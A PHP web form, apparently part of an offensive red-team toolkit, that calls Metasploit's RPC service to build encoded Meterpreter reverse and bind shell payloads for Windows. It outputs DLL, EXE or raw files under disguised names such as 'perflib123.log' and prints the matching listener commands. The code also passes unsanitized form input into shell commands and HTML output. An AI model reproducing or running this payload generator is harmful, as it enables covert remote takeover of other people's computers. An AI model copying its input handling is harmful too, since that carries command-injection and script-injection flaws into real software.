<?php
//error_reporting(E_ALL | E_STRICT);
//ini_set('display_errors', true);

ob_start();
require_once('./includes/lock.php');
//require_once('./includes/template.php');
require_once('./includes/mysql.php');
require_once('./includes/msfrpcd.php');
require_once('./includes/conf.php');

$error = 0;

if (isset($_POST['submit'])) {
	
	//SANITIZE INPUTS!
	$filename = $_POST['filename'];
	$payload = $_POST['payload'];
	$port = $_POST['port'];
	$type = $_POST['payloadtype'];
	$ipaddress = '0.0.0.0';
	$msfrc = "use exploit/multi/handler\r\n";

	//FILENAME SHOULD BE SPECIFIED
	if (empty($filename))
		$error = 1;

	//PAYLOAD SHOULD BE SPECIFIED
	if (empty($payload))
		$error = 1;

	//PORT SHOULD BE SPECIFIED
	if (empty($port))
		$error = 1;

	
	if ($payload == 1) $payloadtype = 'windows/meterpreter/reverse_tcp';
	elseif ($payload == 2) $payloadtype = 'windows/meterpreter/reverse_tcp_dns';
	elseif ($payload == 3) $payloadtype = 'windows/meterpreter/reverse_http';
	elseif ($payload == 4) $payloadtype = 'windows/meterpreter/reverse_https';
	elseif ($payload == 5) $payloadtype = 'windows/meterpreter/bind_tcp';
	elseif ($payload == 6) $payloadtype = 'windows/x64/meterpreter/reverse_tcp';
	elseif ($payload == 7) $payloadtype = 'windows/x64/meterpreter/reverse_https';
	elseif ($payload == 8) $payloadtype = 'windows/x64/meterpreter/bind_tcp';
	else $error = 1;

	$msfrc .= "set PAYLOAD " . $payloadtype . "\r\n";


        //IP ADDRESS SHOULD BE SPECIFIED UNLESS PAYLOAD IS BIND_TCP
        if ($payload != 5 && $payload != 8)
        {
                if (!isset($_POST['ipaddress']) || empty($_POST['ipaddress'])) $error = 1;
                else
                {
                        $ipaddress = $_POST['ipaddress'];
                        $msfrc .= "set LHOST " . $ipaddress . "\r\n";
			$msfrc .= "set LPORT " . $port . "\r\n";
                }
        }
        else
        {
                $msfrc .= "set RHOST remote_ip\r\n";
		$msfrc .= "set RPORT " . $port . "\r\n";
        }

	$msfrc.= "set EXITFUNC thread\r\nexploit";

	if ($error == 0) {

		//TRIM TRAILING OR LEADING SPACES
		$ipaddress = trim($ipaddress);
		$port = trim($port);
		$payload = trim($payload);
		$filename = $OUTPUTDIR . trim($filename);
		$output = "";
	
		if (file_exists($filename)) 
		{
			print "<p class=\"alert alert-info\" style='text-align:center; font-weight:bold'>Filename $filename already exists. Please choose a different filename and try again.</p>";
		} 
		else 
		{
			//DLL
			if($type == 1)
			{
				$output = "dll";
				if($payload < 6) $encoder = "x86/countdown";
				else $encoder = "x64/xor";
			}
			//EXE
			elseif($type == 2)
			{
				$output = "exe";
				if($payload < 6) $encoder = "x86/shikata_ga_nai";
				else $encoder = "x64/xor";
			}
			//RAW
			elseif($type == 3)
			{
				$output = "raw";
				if($payload < 6) $encoder = "x86/countdown";
				else $encoder = "x64/xor";
			}
			else
			{
				print "<p class=\"alert alert-info\" style='text-align:center; font-weight:bold'>An error occurred. Check your inputs!</p>";
			}
			
			$created = use_payload($METASPLOIT, $MSFUSERNAME, $MSFPASSWORD, $payloadtype, $output, $ipaddress, $port, $ipaddress, $port, $encoder, $filename);
			
			if($created == true)
			{
				print "<p class=\"alert alert-info\" style='text-align:center; font-weight:bold'>Payload creation complete and It can be downloaded from the "; ?> $OUTPUTDIR <?php print " specified in conf.php.<br>Meterpreter handler commands are below.</p>";
				print "<pre>$msfrc</pre>";
			}
			else
			{
				print "<p class=\"alert alert-danger\" style='text-align:center; font-weight:bold'>Failed to create payload! Please try again.</p>";
			}
			print "<br><br>";

			/**
			
			
			//OUTPUT TYPE IS DLL
			if ($type == 1) {
				//FILE OUTPUT TYPE
				$output = 'dll';

				//SET ENCODER FOR x64 OR x86
				if ($payload == 6 || $payload == 7)
					$msfencode = $MSFENCODE . " -t " . $output . " -e x64/xor -o " . $OUTPUTDIR . $filename;
				else
					$msfencode = $MSFENCODE . " -t " . $output . " -e x86/countdown -o " . $OUTPUTDIR . $filename;

				//CREATE COMMAND FOR REVERSE SHELL
				if ($payload == 1 || $payload == 2 || $payload == 3 || $payload == 4 || $payload == 6) {
					$command = $MSFPAYLOAD . ' ' . $payloadtype . ' LHOST=' . $ipaddress . ' LPORT=' . $port . ' R | ' . $msfencode;
				}
				////CREATE COMMAND FOR BIND SHELL
				elseif ($payload = 5 || $payload == 7) {
					$command = $MSFPAYLOAD . ' ' . $payloadtype . ' LPORT=' . $port . ' R | ' . $msfencode;
				}
			}
			//OUTPUT TYPE IS EXE
			elseif ($type == 2) {
				//FILE OUTPUT TYPE
				$output = 'exe';

				//SET ENCODER FOR x64 OR x86                
				if ($payload == 6 || $payload == 7)
					$msfencode = $MSFENCODE . " -t " . $output . " -e x64/xor -o " . $OUTPUTDIR . $filename;
				else
					$msfencode = $MSFENCODE . " -t " . $output . " -e x86/shikata_ga_nai -o " . $OUTPUTDIR . $filename;

				//CREATE COMMAND FOR BIND OR REVERSE
				if ($payload == 1 || $payload == 2 || $payload == 3 || $payload == 4 || $payload == 6) {
					$command = $MSFPAYLOAD . ' ' . $payloadtype . ' LHOST=' . $ipaddress . ' LPORT=' . $port . ' R | ' . $msfencode;
				} elseif ($payload = 5 || $payload == 7) {
					$command = $MSFPAYLOAD . ' ' . $payloadtype . ' LPORT=' . $port . ' R | ' . $msfencode;
				}
			}
			//OUTPUT TYPE IS RAW TO HTML FILE
			elseif ($type == 3) {
				//FILE OUTPUT TYPE
				$output = 'raw';

				//SET ENCODER FOR x64 OR x86
				//if($payload == 6 || $payload == 7) $msfencode = $MSFENCODE . " -t " . $output . " -e x64/xor -o " . $OUTPUTDIR . $filename;
				//else $msfencode = $MSFENCODE . " -t " . $output . " -e x86/countdown -b '\\x00\\xff' -o " . $OUTPUTDIR . $filename;
				if ($payload == 6 || $payload == 7)
					$msfencode = $MSFENCODE . " -t " . $output . " -e x64/xor ";
				else
					$msfencode = $MSFENCODE . " -t " . $output . " -e x86/fnstenv_mov -b '\\x00\\xff' ";

				//CREATE COMMAND FOR BIND OR REVERSE
				if ($payload == 1 || $payload == 2 || $payload == 3 || $payload == 4 || $payload == 6) {
					$command = $MSFPAYLOAD . ' ' . $payloadtype . ' LHOST=' . $ipaddress . ' LPORT=' . $port . ' EXITFUNC=thread R | ' . $msfencode . "| /usr/bin/base64 -w 0 > " . $OUTPUTDIR . $filename;
				} elseif ($payload = 5 || $payload == 7) {
					$command = $MSFPAYLOAD . ' ' . $payloadtype . ' LPORT=' . $port . ' EXITFUNC=thread R | ' . $msfencode . "| /usr/bin/base64 -w 0 > " . $OUTPUTDIR . $filename;
				}
			} else {
				print "<p class=\"alert alert-info\" style='text-align:center; font-weight:bold'>An error occurred. Check your inputs!</p>";
			}
			
			//$output = shell_exec($command);
			
			print "<p class=\"alert alert-info\" style='text-align:center; font-weight:bold'>Payload has been created!</p>";
			
			
			//print "<p class=\"alert alert-info\" style='text-align:center; font-weight:bold; font-size:x-small;'>Executed $command</p>";
			**/
		}
	} else {
		print "<p class=\"alert alert-danger\" style='text-align:center; font-weight:bold'>An error occurred. Check your inputs!</p>";
	}
	exit;
}
?>

<div class="modal-header">
	<button type="button" class="close" onclick="$('#metcreatorForm').resetForm();
				$('#outputResponse').html('');" data-dismiss="modal" aria-hidden="true">&times;</button>
	<h4 class="modal-title" id="myModalLabel">Create Meterpreter Payload</h4>
</div>

<div class="modal-body">
	<script>
		$(document).ready(function() {
			var options = {
				target: '#outputResponse',
			};

			$('#metcreatorForm').ajaxForm(options);
		});
	</script>       
	<script>
		function populateMetcreator() {

			var payload = document.getElementById('payload').value;
			var payloadtype = document.getElementById('payloadtype').value;
			var randomnumber = Math.floor(Math.random() * 500);
			document.getElementById('ipaddress').disabled = false;
			
			if (payload == 1)
			{
				document.getElementById('port').value = '53';
			}
			if (payload == 2)
			{
				document.getElementById('port').value = '53';
			}
			if (payload == 3)
			{
				document.getElementById('port').value = '80';
			}
			if (payload == 4)
			{
				document.getElementById('port').value = '443';
			}
			if (payload == 5)
			{
				document.metcreator.ipaddress.disabled = true;
				document.getElementById('port').value = '8080';	
			}
			if (payload == 6)
			{
				document.getElementById('port').value = '53';
			}
			if (payload == 7)
			{
				document.getElementById('port').value = '443';
			}
			if (payload == 8)
			{
				document.metcreator.ipaddress.disabled = true;
				document.getElementById('port').value = '8080';	
			}
			
			
			//1 = Meterpreter Reverse TCP x86
			//2 = Meterpreter Reverse DNS x86
			//3 = Meterpreter Reverse HTTP x86
			//4 = Meterpreter Reverse HTTPS x86
			//5 = Meterpreter Bind TCP x86
			//6 = Meterpreter Reverse TCP x64
			//7 = Meterpreter Reverse HTTPS x64
			//8 = Meterpreter Bind TCP x64
			
			//USING DLL
			if (payloadtype == 1)
			{
				document.getElementById('filename').value = 'perflib' + randomnumber + '.log';
			}
			//USING EXE
			else if (payloadtype == 2)
			{
				document.getElementById('filename').value = 'perflib' + randomnumber + '.exe';
			}
			//USING RAW
			else if (payloadtype == 3)
			{
				document.getElementById('filename').value = 'perflib' + randomnumber + '.html';
			}
		}
	</script>       
	<div>
		<form name='metcreator' id='metcreatorForm' class="form" action="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>" method='POST'>
			<div id="outputResponse"></div>
			<table id='met' class="table">
				<tr>
					<th>Type</th>
					<th>Payload</th>
					<th>Filename</th>
					<th>IP Address</th>
					<th>Port</th>
				</tr>
				<tr>
					<td>
						<select name='payloadtype' class="form-control" id='payloadtype' onchange='populateMetcreator();'>
							<option value='0'>Select a type...</option>
							<option value='3'>RAW</option>
							<option value='1'>DLL</option>
							<option value='2'>EXE</option>
						</select>
					</td>

					<td>
						<select name='payload' class="form-control" id='payload' onchange='populateMetcreator();'>
							<option value='0'>Select a payload...</option>
							<option value='1'>Meterpreter Reverse TCP x86</option>
							<option value='2'>Meterpreter Reverse DNS x86</option>
							<option value='3'>Meterpreter Reverse HTTP x86</option>
							<option value='4'>Meterpreter Reverse HTTPS x86</option>
							<option value='5'>Meterpreter Bind TCP x86</option>
							<option value='6'>Meterpreter Reverse TCP x64</option>
							<option value='7'>Meterpreter Reverse HTTPS x64</option>
							<option value='8'>Meterpreter Bind TCP x64</option>
						</select>
					</td>

					<td>
						<input type='text' class="form-control" id='filename' name='filename' />
					</td>

					<td>
						<input type='text' class="form-control" id='ipaddress' name='ipaddress' />
					</td>

					<td>
						<input type='text' class="form-control" id='port' name='port' size='8' />
					</td>
			</table>
			<center><input type='submit' name='submit' class="btn btn-primary" id='submit' value='Create Payload'></center>
		</form>
	</div>
</div>
<div class="modal-footer">
	<button type="button" onclick="$('#metcreatorForm').resetForm();
				$('#outputResponse').html('');" class="btn btn-danger" data-dismiss="modal">Close</button>
</div>
</div>

<?php
ob_flush();
?>
